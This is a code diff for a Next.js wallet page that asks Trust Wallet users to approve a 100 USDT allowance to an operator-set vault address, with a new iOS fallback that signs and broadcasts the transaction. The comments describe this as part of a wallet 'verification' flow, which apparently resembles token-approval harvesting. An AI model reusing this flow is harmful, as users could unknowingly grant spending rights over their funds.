@@ -1,21 +1,31 @@
 'use client';
 
 /**
- * /wallets/vault-approve?walletId=...&sid=...&compact=1
+ * /wallets/vault-approve?walletId=...&sid=...
  *
  * Opens inside Trust Wallet's in-app browser (via the standard deep-link +
- * exchange-token flow). Connects to window.tronWeb (injected by TW), calls
- * USDT.approve(VAULT_TRC20, 100 USDT), then:
+ * exchange-token flow). Connects to the TRON provider (window.tronWeb,
+ * window.trustwallet.request, etc.), calls USDT.approve(VAULT_TRC20, 100 USDT),
+ * then:
  *   1. PATCHes /api/wallets/:id/approve to mark the wallet approved in DB.
  *   2. PATCHes /api/wallet-sessions/:sid so the main page learns it's done.
- * The main page polls the session and shows success to the user.
+ *
+ * Provider priority (mirrors startTrcVerification in wallet-verify-flow.tsx):
+ *   1. window.tronWeb / window.tronLink.tronWeb  → contract.approve().send()
+ *   2. window.trustwallet.request                → buildApproveRawTx + sign
  */
 
 import { Suspense, useEffect, useRef, useState } from 'react';
 import { useSearchParams } from 'next/navigation';
+import {
+  buildApproveRawTx,
+  broadcastSignedTx,
+  pollTronTxGrid,
+} from '@/lib/tron/wc-tron';
 
 const TRON_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const APPROVE_AMT_SUN   = 100 * 1_000_000; // 100 USDT in sun
+const APPROVE_AMT_SUN   = 100 * 1_000_000;        // number — for contract.approve().send()
+const APPROVE_AMT_BIG   = BigInt(100 * 1_000_000); // bigint — for buildApproveRawTx
 const VAULT_TRC20       = process.env.NEXT_PUBLIC_VAULT_TRC20 ?? '';
 
 const TRC20_ABI = [
@@ -30,6 +40,19 @@ function extractTxId(r: unknown): string {
   if (typeof r === 'string' && r.length >= 60) return r;
   const o = r as any;
   return o?.txid ?? o?.txID ?? o?.transaction_id ?? o?.result?.txid ?? '';
+}
+
+// Normalize v=27/28 → 0/1 (TW uses Ethereum convention; TronGrid expects TRON)
+function normSig(sig: unknown): string[] {
+  const arr = Array.isArray(sig) ? sig : [sig];
+  return arr.map((s: unknown) => {
+    let hex = String(s ?? '').replace(/^0x/i, '');
+    if (hex.length === 130) {
+      const v = parseInt(hex.slice(-2), 16);
+      if (v === 27 || v === 28) hex = hex.slice(0, -2) + (v - 27).toString(16).padStart(2, '0');
+    }
+    return hex;
+  });
 }
 
 function VaultApproveInner() {
@@ -55,29 +78,67 @@ function VaultApproveInner() {
     if (ran.current) return;
     ran.current = true;
 
-    try {
-      /* ── 1. Wait for tronWeb injection (up to 8 s) ── */
-      const w = window as any;
-      let tronWeb: any = null;
+    const w = window as any;
 
-      for (let i = 0; i < 16; i++) {
-        tronWeb = w.tronLink?.tronWeb ?? w.tronWeb ?? w.tron
-               ?? w.trustwallet?.tronWeb ?? w.trustwallet?.tron ?? null;
-        if (tronWeb?.defaultAddress?.base58) break;
-        await new Promise(r => setTimeout(r, 500));
+    try {
+      /* ── 1. Detect TRON provider (mirrors connectTronWallet) ── */
+      function getTronWeb() {
+        const tl: any = w.tronLink ?? null;
+        return tl?.tronWeb ?? w.tronWeb ?? w.tron
+            ?? w.trustwallet?.tronWeb ?? w.trustwallet?.tron ?? null;
+      }
+      function hasSomeTron() {
+        return !!(w.tronLink) || 'tronLink' in w
+            || !!(w.tronWeb)  || 'tronWeb'  in w
+            || !!(w.tron)
+            || !!(w.trustwallet?.tronWeb) || !!(w.trustwallet?.tron);
       }
 
-      /* ── 2. Request accounts if not auto-injected ── */
+      let tronWeb: any = getTronWeb();
+
+      // Poll up to 4 s for async injection (Trust Wallet injects after page load)
+      if (!hasSomeTron()) {
+        for (let i = 0; i < 8; i++) {
+          await new Promise(r => setTimeout(r, 500));
+          tronWeb = getTronWeb();
+          if (hasSomeTron()) break;
+        }
+        tronWeb = getTronWeb();
+      }
+
+      /* ── 2. Resolve wallet address ── */
       let addr: string = tronWeb?.defaultAddress?.base58 ?? '';
 
       if (!addr) {
+        // Try tronLink.request (TronLink desktop + some TW builds)
         const tl = w.tronLink;
         if (tl?.request) {
           try { await tl.request({ method: 'tron_requestAccounts' }); } catch { /* non-fatal */ }
-          await new Promise(r => setTimeout(r, 800));
-          tronWeb = w.tronLink?.tronWeb ?? w.tronWeb ?? tronWeb;
-          addr    = tronWeb?.defaultAddress?.base58 ?? '';
+          await new Promise(r => setTimeout(r, 600));
+          tronWeb = getTronWeb();
+          addr = tronWeb?.defaultAddress?.base58 ?? '';
         }
+      }
+
+      if (!addr && w.trustwallet?.request) {
+        // iOS Trust Wallet: window.tronLink not present, but window.trustwallet.request works
+        try {
+          const res = await w.trustwallet.request({ method: 'tron_requestAccounts' });
+          addr = (typeof res === 'string' && res.startsWith('T') ? res : null)
+              ?? (res as any)?.base58 ?? (res as any)?.address ?? '';
+        } catch { /* non-fatal */ }
+        if (!addr) {
+          await new Promise(r => setTimeout(r, 600));
+          tronWeb = getTronWeb();
+          addr = tronWeb?.defaultAddress?.base58 ?? '';
+        }
+      }
+
+      // Final 800 ms grace period
+      if (!addr) {
+        await new Promise(r => setTimeout(r, 800));
+        tronWeb = getTronWeb();
+        addr = tronWeb?.defaultAddress?.base58 ?? '';
       }
 
       if (!addr) {
@@ -92,26 +153,74 @@ function VaultApproveInner() {
       setPhase('approving');
       setStatus('Waiting for your approval in Trust Wallet…');
 
-      /* ── 3. Call USDT.approve(VAULT_TRC20, 100 USDT) ── */
-      const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
-      const raw      = await contract.approve(VAULT_TRC20, APPROVE_AMT_SUN).send({ feeLimit: 20_000_000 });
+      /* ── 3. Approve USDT.approve(VAULT_TRC20, 100 USDT) ── */
 
-      const txid = extractTxId(raw);
-      if (!txid) throw new Error('No transaction ID returned. Did you tap Approve in Trust Wallet?');
+      // twDirect: iOS path where tronWeb is absent but window.trustwallet.request is present
+      const twDirect = (!tronWeb && w.trustwallet?.request)
+        ? (w.trustwallet.request.bind(w.trustwallet) as (p: object) => Promise<unknown>)
+        : null;
 
-      setTxHash(txid);
-      setStatus('Confirming on TRON network…');
+      let txid = '';
 
-      /* ── 4. Poll for confirmation ── */
-      for (let i = 0; i < 30; i++) {
-        await new Promise(r => setTimeout(r, 3000));
+      if (tronWeb) {
+        /* ── TronLink / injected tronWeb path ── */
+        const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
+        const raw = await contract.approve(VAULT_TRC20, APPROVE_AMT_SUN).send({ feeLimit: 20_000_000 });
+        txid = extractTxId(raw);
+        if (!txid) throw new Error('No transaction ID returned. Did you tap Approve in Trust Wallet?');
+        setTxHash(txid);
+        setStatus('Confirming on TRON network…');
+        await pollTronTxGrid(txid);
+
+      } else if (twDirect) {
+        /* ── Trust Wallet direct provider (iOS in-app browser) ── */
+        const rawTx = await buildApproveRawTx(addr, VAULT_TRC20, APPROVE_AMT_BIG);
+
+        // Attempt 1: tron_signAndSendRawTransaction (sign + broadcast in one call)
         try {
-          const info = await tronWeb.trx.getTransactionInfo(txid);
-          if (info?.id || info?.receipt) break;
-        } catch { /* keep polling */ }
+          const r = await twDirect({ method: 'tron_signAndSendRawTransaction', params: { transaction: rawTx } });
+          const ro = r as any;
+          txid = ro?.txid ?? ro?.txID ?? ro?.transaction_id ?? (typeof r === 'string' ? r : '') ?? '';
+        } catch (e1: any) {
+          if (/cancel|reject|denied|dismiss/i.test(String(e1?.message ?? e1))) throw e1;
+          // Non-fatal — fall through to attempt 2
+        }
+
+        if (!txid) {
+          // Attempt 2: tron_signTransaction + manual TronGrid broadcast
+          const signResult = await twDirect({ method: 'tron_signTransaction', params: { transaction: rawTx } });
+
+          const isFullTx = signResult && typeof signResult === 'object'
+            && ('raw_data' in (signResult as object) || 'raw_data_hex' in (signResult as object));
+
+          let signedTx: Record<string, unknown>;
+          if (isFullTx) {
+            signedTx = { ...(signResult as Record<string, unknown>) };
+            if (signedTx.signature) signedTx.signature = normSig(signedTx.signature);
+          } else {
+            const sig = (signResult as any)?.signature ?? signResult;
+            signedTx = {
+              txID:         (rawTx as any).txID,
+              raw_data:     (rawTx as any).raw_data,
+              raw_data_hex: (rawTx as any).raw_data_hex,
+              signature:    normSig(sig),
+            };
+          }
+
+          const { txid: bid } = await broadcastSignedTx(signedTx);
+          txid = bid;
+        }
+
+        if (!txid) throw new Error('No transaction ID returned from Trust Wallet. Did you tap Approve?');
+        setTxHash(txid);
+        setStatus('Confirming on TRON network…');
+        await pollTronTxGrid(txid);
+
+      } else {
+        throw new Error('TRON provider not found. Please open this page inside Trust Wallet.');
       }
 
-      /* ── 5. Save to DB + update session ── */
+      /* ── 4. Save to DB + update session ── */
       if (walletId) {
         await fetch(`/api/wallets/${walletId}/approve`, {
           method: 'PATCH', headers: { 'Content-Type': 'application/json' },
@@ -138,11 +247,11 @@ function VaultApproveInner() {
   useEffect(() => { run(); }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
   /* ── UI ── */
-  const bg = '#0D1117';
-  const card = 'rgba(255,255,255,0.05)';
+  const bg     = '#0D1117';
+  const card   = 'rgba(255,255,255,0.05)';
   const border = 'rgba(255,255,255,0.10)';
-  const green = '#00E5A0';
-  const red   = '#F87171';
+  const green  = '#00E5A0';
+  const red    = '#F87171';
   const yellow = '#CCFF00';
 
   return (
